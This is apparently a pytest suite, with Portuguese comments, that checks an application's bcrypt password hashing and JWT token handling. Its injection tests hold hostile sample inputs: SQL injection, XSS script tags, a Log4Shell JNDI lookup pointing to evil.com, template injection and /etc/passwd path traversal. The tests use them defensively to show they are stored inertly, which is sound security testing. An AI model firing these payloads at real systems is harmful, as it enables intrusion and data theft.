import pytest
import time
import jwt
from datetime import datetime, timedelta
from unittest.mock import patch, Mock
from passlib.context import CryptContext

from app.core.security import (
    verify_password,
    get_password_hash,
    create_access_token,
    verify_token,
)
from app.core.config import settings


class TestPasswordHashing:
    """Testes críticos para funções de hash de senha"""

    def test_password_hash_generation(self):
        """Teste: geração de hash de senha"""
        password = "test_password_123"
        hashed = get_password_hash(password)

        # Hash deve ser diferente da senha original
        assert hashed != password
        # Hash deve ter formato bcrypt
        assert hashed.startswith("$2b$")
        # Hash deve ter comprimento adequado
        assert len(hashed) >= 60

    def test_password_verification_success(self):
        """Teste: verificação de senha correta"""
        password = "correct_password_456"
        hashed = get_password_hash(password)

        assert verify_password(password, hashed) is True

    def test_password_verification_failure(self):
        """Teste: verificação de senha incorreta"""
        correct_password = "correct_password"
        wrong_password = "wrong_password"
        hashed = get_password_hash(correct_password)

        assert verify_password(wrong_password, hashed) is False

    def test_password_hash_uniqueness(self):
        """Teste: cada hash deve ser único (salt aleatório)"""
        password = "same_password"
        hash1 = get_password_hash(password)
        hash2 = get_password_hash(password)

        # Hashes devem ser diferentes devido ao salt
        assert hash1 != hash2
        # Mas ambos devem verificar a mesma senha
        assert verify_password(password, hash1) is True
        assert verify_password(password, hash2) is True

    def test_password_timing_attack_protection(self):
        """Teste: proteção contra timing attacks na verificação"""
        password = "test_password"
        hashed = get_password_hash(password)

        # Medir tempo para senha correta
        start_time = time.time()
        verify_password(password, hashed)
        correct_time = time.time() - start_time

        # Medir tempo para senha incorreta
        start_time = time.time()
        verify_password("wrong_password", hashed)
        wrong_time = time.time() - start_time

        # Tempos devem ser similares (diferença < 100ms)
        # bcrypt naturalmente protege contra timing attacks
        assert abs(correct_time - wrong_time) < 0.1

    def test_password_edge_cases(self):
        """Teste: casos extremos de senha"""
        edge_cases = [
            "",  # Senha vazia
            " ",  # Apenas espaço
            "a",  # Senha de 1 caractere
            "a" * 1000,  # Senha muito longa
            "🔐🗝️🛡️",  # Emojis
            "Ação123!@#",  # Caracteres especiais e acentos
            "\n\t\r",  # Caracteres de controle
            "null\x00byte",  # Null byte
        ]

        for password in edge_cases:
            hashed = get_password_hash(password)
            assert verify_password(password, hashed) is True
            assert verify_password(password + "x", hashed) is False

    def test_password_injection_attempts(self):
        """Teste: tentativas de injeção em senhas"""
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "../../../etc/passwd",
            "SELECT * FROM users WHERE 1=1",
        ]

        for attempt in injection_attempts:
            hashed = get_password_hash(attempt)
            # Deve funcionar normalmente, sem executar código
            assert verify_password(attempt, hashed) is True
            assert verify_password("safe_password", hashed) is False

    def test_password_hash_strength(self):
        """Teste: força do algoritmo de hash"""
        password = "test_password"

        # Verificar se está usando bcrypt com rounds adequados
        hashed = get_password_hash(password)

        # bcrypt format: $2b$rounds$salt+hash
        parts = hashed.split("$")
        assert len(parts) >= 4
        assert parts[1] == "2b"  # bcrypt variant

        # Rounds devem ser >= 12 para segurança adequada
        rounds = int(parts[2])
        assert rounds >= 12

    def test_password_concurrent_hashing(self):
        """Teste: hashing concorrente de senhas"""
        import asyncio
        import concurrent.futures

        def hash_password(password):
            return get_password_hash(password)

        passwords = [f"password_{i}" for i in range(10)]

        # Executar hashing em paralelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(hash_password, pwd) for pwd in passwords]
            hashes = [
                future.result() for future in concurrent.futures.as_completed(futures)
            ]

        # Todos os hashes devem ser válidos
        assert len(hashes) == len(passwords)
        for i, hash_result in enumerate(hashes):
            # Encontrar qual senha corresponde a este hash
            for password in passwords:
                if verify_password(password, hash_result):
                    break
            else:
                pytest.fail(f"Hash {i} não corresponde a nenhuma senha")


class TestJWTTokens:
    """Testes críticos para tokens JWT"""

    def test_create_access_token_success(self):
        """Teste: criação de token de acesso válido"""
        data = {"sub": "123", "email": "test@example.com"}
        token = create_access_token(data)

        # Token deve ser uma string não vazia
        assert isinstance(token, str)
        assert len(token) > 0

        # Token deve ter 3 partes (header.payload.signature)
        parts = token.split(".")
        assert len(parts) == 3

    def test_create_access_token_with_expiration(self):
        """Teste: criação de token com expiração customizada"""
        data = {"sub": "123"}
        expires_delta = timedelta(minutes=30)
        token = create_access_token(data, expires_delta)

        # Decodificar token para verificar expiração
        decoded = jwt.decode(
            token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM]
        )

        # Verificar se exp está definido corretamente
        assert "exp" in decoded
        exp_time = datetime.fromtimestamp(decoded["exp"])
        expected_time = datetime.utcnow() + expires_delta

        # Diferença deve ser menor que 1 minuto
        assert abs((exp_time - expected_time).total_seconds()) < 60

    def test_verify_token_success(self):
        """Teste: verificação de token válido"""
        data = {"sub": "123", "email": "test@example.com"}
        token = create_access_token(data)

        decoded_data = verify_token(token)

        assert decoded_data["sub"] == "123"
        assert decoded_data["email"] == "test@example.com"
        assert "exp" in decoded_data

    def test_verify_token_expired(self):
        """Teste: verificação de token expirado"""
        data = {"sub": "123"}
        # Criar token que expira imediatamente
        expires_delta = timedelta(seconds=-1)
        token = create_access_token(data, expires_delta)

        with pytest.raises(jwt.ExpiredSignatureError):
            verify_token(token)

    def test_verify_token_invalid_signature(self):
        """Teste: token com assinatura inválida"""
        data = {"sub": "123"}
        token = create_access_token(data)

        # Modificar última parte (assinatura)
        parts = token.split(".")
        parts[2] = "invalid_signature"
        invalid_token = ".".join(parts)

        with pytest.raises(jwt.InvalidSignatureError):
            verify_token(invalid_token)

    def test_verify_token_malformed(self):
        """Teste: tokens malformados"""
        malformed_tokens = [
            "not.a.jwt",
            "only_one_part",
            "two.parts",
            "four.parts.are.invalid",
            "",
            "...",
            "valid.header.but_invalid_base64!",
        ]

        for token in malformed_tokens:
            with pytest.raises((jwt.DecodeError, jwt.InvalidTokenError)):
                verify_token(token)

    def test_verify_token_wrong_algorithm(self):
        """Teste: token criado com algoritmo diferente"""
        data = {"sub": "123"}

        # Criar token com algoritmo diferente
        wrong_algo_token = jwt.encode(data, settings.SECRET_KEY, algorithm="HS512")

        with pytest.raises(jwt.InvalidAlgorithmError):
            verify_token(wrong_algo_token)

    def test_verify_token_wrong_secret(self):
        """Teste: token criado com chave secreta diferente"""
        data = {"sub": "123"}
        wrong_secret_token = jwt.encode(
            data, "wrong_secret", algorithm=settings.ALGORITHM
        )

        with pytest.raises(jwt.InvalidSignatureError):
            verify_token(wrong_secret_token)

    def test_token_payload_injection(self):
        """Teste: tentativas de injeção no payload do token"""
        malicious_payloads = [
            {"sub": "'; DROP TABLE users; --"},
            {"sub": "<script>alert('xss')</script>"},
            {"sub": "../../../etc/passwd"},
            {"sub": "${jndi:ldap://evil.com/a}"},
            {"sub": "{{7*7}}"},
            {"role": "MASTER", "sub": "1"},  # Tentativa de escalação
            {"is_admin": True, "sub": "1"},
        ]

        for payload in malicious_payloads:
            token = create_access_token(payload)
            decoded = verify_token(token)

            # Dados devem ser preservados como strings, não executados
            assert decoded["sub"] == payload["sub"]
            if "role" in payload:
                assert decoded["role"] == payload["role"]

    def test_token_size_limits(self):
        """Teste: limites de tamanho do token"""
        # Payload muito grande
        large_data = {"sub": "1", "data": "x" * 10000}
        token = create_access_token(large_data)

        # Token deve ser criado, mas pode ser rejeitado por tamanho
        assert isinstance(token, str)

        # Verificar se ainda pode ser decodificado
        decoded = verify_token(token)
        assert decoded["sub"] == "1"
        assert len(decoded["data"]) == 10000

    def test_token_concurrent_creation_verification(self):
        """Teste: criação e verificação concorrente de tokens"""
        import concurrent.futures

        def create_and_verify_token(user_id):
            data = {"sub": str(user_id)}
            token = create_access_token(data)
            decoded = verify_token(token)
            return decoded["sub"] == str(user_id)

        # Executar 20 operações concorrentes
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(create_and_verify_token, i) for i in range(20)]
            results = [
                future.result() for future in concurrent.futures.as_completed(futures)
            ]

        # Todas as operações devem ser bem-sucedidas
        assert all(results)

    def test_token_replay_attack_protection(self):
        """Teste: proteção contra ataques de replay"""
        data = {"sub": "123"}
        token = create_access_token(data)

        # Token deve ser válido múltiplas vezes (stateless)
        for _ in range(5):
            decoded = verify_token(token)
            assert decoded["sub"] == "123"

        # Mas deve expirar após o tempo definido
        # (Em produção, seria implementado blacklist de tokens)

    def test_token_algorithm_confusion(self):
        """Teste: proteção contra algorithm confusion attacks"""
        data = {"sub": "123"}

        # Tentar criar token com 'none' algorithm
        none_token = jwt.encode(data, "", algorithm="none")

        # Deve falhar na verificação
        with pytest.raises(jwt.InvalidAlgorithmError):
            verify_token(none_token)

    def test_token_key_confusion(self):
        """Teste: proteção contra key confusion attacks"""
        # Simular tentativa de usar chave pública como chave secreta
        data = {"sub": "123"}

        # Em um ataque real, atacante tentaria usar chave pública
        # como chave secreta para HMAC
        fake_public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."

        try:
            malicious_token = jwt.encode(
                data, fake_public_key, algorithm=settings.ALGORITHM
            )
            with pytest.raises(jwt.InvalidSignatureError):
                verify_token(malicious_token)
        except Exception:
            # Se falhar na criação, também é aceitável
            pass


class TestSecurityConfiguration:
    """Testes para configurações de segurança"""

    def test_secret_key_strength(self):
        """Teste: força da chave secreta"""
        secret = settings.SECRET_KEY

        # Chave deve ter comprimento adequado
        assert len(secret) >= 32

        # Chave deve conter caracteres variados
        assert any(c.islower() for c in secret)
        assert any(c.isupper() for c in secret)
        assert any(c.isdigit() for c in secret)

    def test_algorithm_security(self):
        """Teste: algoritmo de JWT seguro"""
        # Deve usar algoritmo HMAC seguro
        assert settings.ALGORITHM in ["HS256", "HS384", "HS512"]
        # HS256 é aceitável para a maioria dos casos
        assert settings.ALGORITHM == "HS256"

    def test_token_expiration_time(self):
        """Teste: tempo de expiração adequado"""
        # Tempo de expiração não deve ser muito longo
        assert settings.ACCESS_TOKEN_EXPIRE_MINUTES <= 1440  # Máximo 24 horas
        assert settings.ACCESS_TOKEN_EXPIRE_MINUTES >= 15  # Mínimo 15 minutos

    @patch("app.core.config.settings")
    def test_configuration_tampering_protection(self, mock_settings):
        """Teste: proteção contra alteração de configurações"""
        # Simular tentativa de alterar configurações em runtime
        original_secret = settings.SECRET_KEY
        original_algorithm = settings.ALGORITHM

        # Tentar alterar configurações
        mock_settings.SECRET_KEY = "compromised_key"
        mock_settings.ALGORITHM = "none"

        # Funções devem usar configurações originais
        data = {"sub": "123"}
        token = create_access_token(data)

        # Token deve ser criado com configurações originais
        # (em implementação real, configurações devem ser imutáveis)
        decoded = jwt.decode(token, original_secret, algorithms=[original_algorithm])
        assert decoded["sub"] == "123"


class TestCryptographicSecurity:
    """Testes de segurança criptográfica"""

    def test_random_salt_generation(self):
        """Teste: geração de salt aleatório"""
        password = "same_password"
        hashes = [get_password_hash(password) for _ in range(10)]

        # Todos os hashes devem ser diferentes
        assert len(set(hashes)) == len(hashes)

    def test_cryptographic_randomness(self):
        """Teste: qualidade da aleatoriedade criptográfica"""
        tokens = [create_access_token({"sub": "1"}) for _ in range(100)]

        # Todos os tokens devem ser únicos
        assert len(set(tokens)) == len(tokens)

        # Verificar distribuição de caracteres (teste básico)
        all_chars = "".join(tokens)
        char_counts = {}
        for char in all_chars:
            char_counts[char] = char_counts.get(char, 0) + 1

        # Deve haver boa distribuição de caracteres
        assert len(char_counts) > 10  # Pelo menos 10 caracteres diferentes

    def test_side_channel_attack_protection(self):
        """Teste: proteção contra ataques de canal lateral"""
        password = "test_password"
        correct_hash = get_password_hash(password)

        # Medir tempos de verificação para diferentes senhas
        times = []
        test_passwords = [
            password,  # Correta
            "wrong1",  # Incorreta curta
            "wrong_password_long",  # Incorreta longa
            "test_passwor",  # Quase correta
            "x" * len(password),  # Mesmo tamanho, incorreta
        ]

        for test_pwd in test_passwords:
            start_time = time.time()
            verify_password(test_pwd, correct_hash)
            end_time = time.time()
            times.append(end_time - start_time)

        # Tempos devem ser similares (bcrypt protege naturalmente)
        max_time = max(times)
        min_time = min(times)
        # Diferença não deve ser muito grande
        assert (max_time - min_time) < 0.1
